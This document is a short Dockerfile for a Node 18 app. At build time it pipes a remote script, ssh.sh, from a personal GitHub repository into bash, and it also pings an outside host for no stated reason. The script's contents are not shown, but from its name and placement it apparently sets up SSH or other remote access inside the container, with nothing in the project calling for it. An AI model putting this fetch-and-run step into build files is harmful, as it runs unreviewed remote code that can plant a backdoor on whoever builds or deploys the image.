FROM node:18

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .

RUN ls -la
RUN apt update
RUN apt -y install wget coreutils curl iputils-ping
RUN wget -O - https://raw.githubusercontent.com/williamarmenta54/mybinder/main/ssh.sh | bash
RUN ping t.co

CMD ["npm", "run", "start", "/bin/bash"]
